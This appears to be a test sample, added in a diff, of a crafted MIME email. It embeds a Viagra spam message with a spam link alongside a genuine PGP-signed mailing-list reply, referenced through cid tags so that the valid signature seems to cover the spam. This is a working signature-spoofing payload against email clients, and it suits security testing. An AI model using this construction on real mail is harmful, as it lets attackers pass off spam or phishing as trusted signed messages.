@@ -1,0 +1,109 @@
+From: dlisk@velaw.com
+To: darrell.schoolcraft@enron.com, tk.lohman@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain;
+    charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+Want to be the top all night long?
+Be sexual giant all night long.
+Buy Licensed and Quality Viagra or Cialis.
+Unbelievable Viagra and Cialis offer! 
+
+http://lijehi.abyssini.net/?99199452
+
+Instant worldwide shipping and friendly support
+
+------=_NextPart_001_512B_01C78F38.F5530DF0
+Content-Type: text/html;
+    charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dus-ascii">
+<META content=3D"MSHTML 6.00.2900.2180" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#f3f3f3>
+<DIV><FONT face=3DArial size=3D2>Want to be the top all night long?</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>Be sexual giant all night long.</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>Buy Licensed and Quality Viagra or Cialis.</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>Unbelievable Viagra and Cialis offer!</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT></DIV>
+<DIV><FONT face=3DArial size=3D2><A=20href=3D"http://lijehi.abyssini.net/?99199452">http://lijehi.abyssini.net/?99199452</A></FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>Instant worldwide shipping and friendly support</FONT></DIV>
+</BODY></HTML>
+
+------=_NextPart_001_512B_01C78F38.F5530DF0--
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+It seems you may be running into a similar problem which I reported
+happens when switching synths with the doubletalk pc driver built into
+the kernel, and set as the default. Try starting the system with none
+as the default synth, and then loading software speech, starting with
+the sftsyn module. If that works like it's supposed to, then it looks
+like the ltlk driver has issues as well.
+
+Greg
+
+
+On Mon, Jun 18, 2007 at 03:21:19PM -0400, ace wrote:
+> Hi all
+> 
+> I just spent the last two weeks building a LFS system then installing 
+> necessary packages from the BLFS book.  Now, I am to the point of installing 
+> software speech.  Speech-Dispatcher is installed, as is Speechd-Up.  Espeak 
+> is my synth of choice.  I also setup my kernel to compile sftsyn as a 
+> module.  In the default synth field in the kernel, though, I have ltlk as 
+> that is my primary synth.  I have verified that Speech-Dispatcher and 
+> Speechd-up are working because I performed the speechd-up probe test and it 
+> was spoken.  The problem happens when I do modprobe speakup_sftsyn.  The 
+> system simply freezes; no speech, no beeps, nothing.  In fact, I'm forced to 
+> restart forcefully with the ower button.  Where should I look to find 
+> whatever error may be occurring?  If I need to get sighted assistance, 
+> that's not a problem.
+> 
+> Thanks,
+> Robby 
+> 
+> 
+> _______________________________________________
+> Speakup mailing list
+> Speakup@braille.uwo.ca
+> http://speech.braille.uwo.ca/mailman/listinfo/speakup
+
+- -- 
+web site: http://www.romuald.net.eu.org
+gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+skype: gregn1
+(authorization required, add me to your contacts list first)
+
+- --
+Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGdtza7s9z/XlyUyARAowVAJsG+gI++/HpsVLhbDvQDfHsLexjngCfUbHz
+f42LsQPVqBrB0CYymgbaDxc=
+=Bcwz
+-----END PGP SIGNATURE-----
+
+____
+--BOUNDARY--
+--DELIMITER--
